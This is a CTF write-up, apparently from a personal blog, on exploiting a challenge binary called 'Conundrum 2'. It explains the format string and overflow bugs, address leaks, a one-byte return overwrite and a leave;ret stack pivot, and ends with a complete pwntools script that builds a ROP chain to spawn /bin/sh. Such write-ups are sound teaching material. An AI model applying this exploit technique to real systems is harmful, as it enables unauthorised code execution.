<h3> Conundrum 2 </h3>

Hi there, some months ago I was given some set of challenges made by `mug3njutsu` for a ctf but at the end of the event, it got no solve :(
![image](https://github.com/user-attachments/assets/fa8fff24-d0ed-4eeb-8872-0e5d51771af0)

So I decided to tackle them and was able to solve 3/4 of the challenges for which i made a solution [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/bsides_nairaobi/writeup.md)

The last one i wasn't able to do it
![image](https://github.com/user-attachments/assets/4fa437ad-10f4-4fa1-8a08-0adb088bb05f)

At that time i wasn't so much familiar with various techniques so i thought it was a format string one shot sort of exploitation (maybe that's still possible im just not that good yet! 😅)

I still had the challenge file saved and while scrolling through challenges i should tackle today i came across it and decided to give it a shot
![image](https://github.com/user-attachments/assets/9ca2ec2f-51ab-44fc-bcd2-f722bb76d09b)

Now then let's start :)

The challenge came with its glibc file and linker, so the first thing I did was patch it to ensure the same libc would be used on my device as on the remote
![image](https://github.com/user-attachments/assets/830a5e52-5eb0-4b59-95ee-93970a7e6747)

```
pwninit --bin conundrum_v2 --libc libc.so.6 --ld ld-linux-x86-64.so.2 --no-template
```

Next thing is to get an idea as to what type of file we are working with and the protection enabled on it
![image](https://github.com/user-attachments/assets/570f7798-cc6b-48b7-9852-b1ebbb85cd9f)

We can see that it is a 64 bits executable which is dynamically linked and not stripped and from the protections enabled it's clear that only the stack canary is disblaed

Now i ran the binary to get an overview of what it does
![image](https://github.com/user-attachments/assets/9a53e7ee-9c3d-46bc-9525-584b49ec9b4b)

It seems to print some menu, receives our choice and based on the choice provided does some other stuffs

With that in mind it's time to figure out the vulnerability

Using IDA (ofc) i decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/23f960fc-1c0e-4062-9810-c87c3c442909)

First it calls the `setup` function which disables buffering on `stdout`
![image](https://github.com/user-attachments/assets/9a50f60a-ddd6-41a8-beea-6f7a49c1c440)

Then it prints out some text which is the menu thingy

After that it reads in our input and checks this:
- If we give it 1 it would exit
- If we give it anything aside 1 or 2 it would exit
- If we give it 2 it would call the `question` function

We now know that our vulnerability lies in the question function. Here's the decompiled code
![image](https://github.com/user-attachments/assets/2c344559-3806-468e-a7eb-35d77d93f330)

```c
int question()
{
  char s[128]; // [rsp+0h] [rbp-80h] BYREF

  memset(s, 0, sizeof(s));
  write(1, "Educate me, what's so interesting about pointers: ", 0x32uLL);
  read(0, s, 0x8CuLL);
  return printf(s);
}
```

It looks awfully small :) 

From this we know that:
- It would clear up the buffer `s` up to 128 bytes filling it with null bytes
- Prints out some texts
- Receives our input which is stored in s
- Prints out input
- Returns the number of bytes returned from calling `printf`

Ok good so the bug is pretty obvious:
- We have a buffer overflow
- And a format string bug

The buffer overflow occurs because we are reading up to 140 bytes into the buffer, while the buffer `s` can hold only a maximum of 128 bytes

Additionally, there is a format string vulnerability (FSB) because the code uses `printf` on `s` without specifying a format string

But looking at the overflow we can see that we can't fully control the return address due to the fact that we have only 4 bytes overwrite

```
140 - 128 = 12
12 - 8 = 4 (8 bytes for the saved rbp)
4 bytes for the saved return address
```

Regardless of that we don't know the memory mapping of the binary itself due to `PIE` that means we need to leak it to be able to pivot around memory

Ideally we could exploit the fsb to get code execution but that requires multiple arbitrary write and this is not the case since we only have one shot to calling `printf`

So what now?

Well this is how i went around this

First we need memory leaks and that's really important and i leveraged the fsb for that

But thinking further we also need a way to call the `question` function again if possible multiple times 

What do i mean, well we could get memory leaks using the fsb but here's what happens
![image](https://github.com/user-attachments/assets/f4043d82-0852-40eb-83b9-6ca0cf9cc801)

See!!, it would just exit so this means we have to call the `question` function again and to do that i leveraged a partial overwrite using the overflow

Here's what i mean, before the function is about to return this is how the memory looks like
![image](https://github.com/user-attachments/assets/5c65bfd6-c44c-459f-bde5-c0a044f31580)

```
pwndbg> x/50gx $rsp
0x7ffc5281c090:	0x4141414141414141	0x0000000000000000
0x7ffc5281c0a0:	0x0000000000000000	0x0000000000000000
0x7ffc5281c0b0:	0x0000000000000000	0x0000000000000000
0x7ffc5281c0c0:	0x0000000000000000	0x0000000000000000
0x7ffc5281c0d0:	0x0000000000000000	0x0000000000000000
0x7ffc5281c0e0:	0x0000000000000000	0x0000000000000000
0x7ffc5281c0f0:	0x0000000000000000	0x0000000000000000
0x7ffc5281c100:	0x0000000000000000	0x0000000000000000
0x7ffc5281c110:	0x00007ffc5281c130	0x000055f4a360094d
```

Basically this is the stack view
![image](https://github.com/user-attachments/assets/f87e96df-17cf-43a1-b6f3-438c889b7187)

```
buffer -> saved rbp -> return address
```

We can see that the binary is actually going to return back to `0x000055f4a360094d` and that points to `main+114`
![image](https://github.com/user-attachments/assets/71c866f6-2b79-476a-a803-b3d6e2d4db7f)

So our goal is that instead of overwritting the 4 bytes of the return address we would overwrite just the lsb 
![image](https://github.com/user-attachments/assets/1cffe83a-6a8d-4914-a205-11dcff298b82)

I looked for a suitable offset to target, and `main+134` seemed to be the best choice because it zeros out the eax register and calls the question function

Why is this the best choice, you might ask? The reason is simply that it falls within the same address range as the address the question function returns to

We could have considered jumping back to main, but that would require nibble-level brute-forcing. This is because, even if the last 3 nibbles of an address are the same, the upper bytes are randomized due to ASLR and PIE

It's best to avoid brute-forcing in order to make the exploit more reliable

With that in mind, our goal becomes straightforward:
- Fill the buffer
- Overwrite the saved rbp
- Overwrite one byte of the return address to point to `main+134`

However, we won’t simply fill the buffer with junk. Instead, we’ll use some format string specifiers such that after it's passed to `printf` it would give us memory leaks

But what offset should we actually leak from because we can't spam the buffer with `%p.` though that works but i prefer not doing it that way because it could overwrite some pointers on the stack and those points might be important addresses mapping to libc, ld, etc.

This is how i do it, we need to set a breakpoint at the call to `printf` which is at `question+86`
![image](https://github.com/user-attachments/assets/0ab4dbe8-ea9a-4210-8998-f20b8e7dea7b)

Next we take a look at the stack
![image](https://github.com/user-attachments/assets/7bba3f75-8663-47a5-9778-568fefd8f90b)

We can see some important pointers mapping to libc, ld, stack, elf

I would leak that of libc, stack and the elf

The important address i mentioned are at offset:
- 24
- 27
- 31

Doing that we can have the important leaks and also jump back to the `question` function
![image](https://github.com/user-attachments/assets/15d3ab0f-84f7-40ce-a0ac-bac1428e9ed3)
![image](https://github.com/user-attachments/assets/0e7d67bb-ab43-420a-9959-226df8054725)

Incase you are wondering how i got those offset you can read [this](https://github.com/Mymaqn/The-danger-of-repetivive-format-string-vulnerabilities-and-abusing-exit-on-full-RELRO?tab=readme-ov-file#the-danger-of-repetivive-format-string-vulnerabilities-and-abusing-exit-on-full-relro)

Now you might have also wondered what's the use of leaking a stack address well here's why:
- Since we overwrote the saved rbp with junk value, when the `main` function is about to `ret` it would crash

So i leaked that inorder to calculate the saved rbp which was previously there such that during my next overwrite i would replace it with the original value

That was my initial plan

But why exactly would it crash?

The reason is because of the instruction at `main+173`
![image](https://github.com/user-attachments/assets/154e35f2-ff55-4b8d-8f1c-bbecd6d652fa)

```
leave
ret
```

That instruction is equivalent to

```
mov rsp, rbp
pop rbp
pop rip
```

And the reason it does that is just a C function epilogue thingy

Pretty much that, but then my exploitation plan was to write a ropchain on `main's` return address stack frame

Basically i planned on using the format string bug for code execution but then i thought why that? 

It's pretty stressful because i would have to keep on calling `question` multiple times to do the arbitrary write though it might work but let us not overcomplicate things!

At this point we have leaks right? so what i decided to do was to stack pivot!

And i leveraged the fact that main used a `leave; ret` instruction to stack pivot

You can find more on the technique [here](https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting#leave-ret)

What i did was to basically fill `question` saved rbp with the address of our `buffer` which currently holds our ropchain then when `main` is about to return it's current `rbp` would be pointing to the `buf` address

And after executing the instruction

```
mov rsp, rbp
pop rbp
pop rip
```

It moves the current value in the `rbp` register to `rsp`, and after a pop instruction, it executes a `pop rip` 💀

Remember, a `pop` instruction removes the value from the top of the stack and stores it in the specified register

This means that after setting `rbp` to a fake address, the program will use the content of rbp to continue the execution flow

Take note of the first `pop` instruction though as that occupies 8 bytes!

Our goal now is easy!

First we fill up the buffer with 8 bytes junk + our ropchain chain which effectively does a `system('/bin/sh')` + pad to 128 bytes + address of buffer

Now when `question` returns then `main` will also try `ret` but then it would execute our ropchain

Profit!

Here's my final solve script

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('conundrum_v2_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x8b5
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    leaks = f"%24$p.%27$p.%31$p.".encode()
    partial_overwrite = leaks + b"A"*(128 - len(leaks)) + b"B"*8
    io.sendlineafter(b"honestly):", b"2")
    io.sendafter(b"pointers:", partial_overwrite + p8(0x43))
    r = io.recv_raw(160)
    leaks = r.split(b".")
    libc.address = int(leaks[1], 16) - 0x21c87
    exe.address = int(leaks[2], 16) - exe.sym["main"]
    buf = int(leaks[0], 16) - 0x180

    info("libc base: %#x", libc.address)
    info("elf base: %#x", exe.address)
    info("stack addr: %#x", buf)

    pop_rdi = exe.address + 0x9d3 # pop rdi; ret;
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]
    ret = exe.address + 0x0696 # ret;

    payload = flat(
        [
            pop_rdi,
            sh,
            ret,
            system
        ]
    )

    payload = b"A"*8 + payload
    fake_rbp = payload.ljust(128, b".") + p64(buf)
    io.sendafter(b"pointers:", fake_rbp)
    io.clean()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
```

Running it works.
![image](https://github.com/user-attachments/assets/30f5382f-e1c5-4205-8b33-bb15f7943f09)

I'm still yet to make the writeup for another of his challenge i solved recently in a ctf hosted by perfectroot which was mainly about bypassing seccomp using `name_to_handle_at, open_by_handle_at, pread64 & writev` syscalls, you can check my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Kumbavu%20Zako/solve.py) and [C poc](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/scripts/Kumbavu%20Zako/poc.c) here
![poc](https://github.com/user-attachments/assets/9ec58f16-6b2d-41c1-aa87-b9ab95d4914d)


That's all, thanks for reading :)



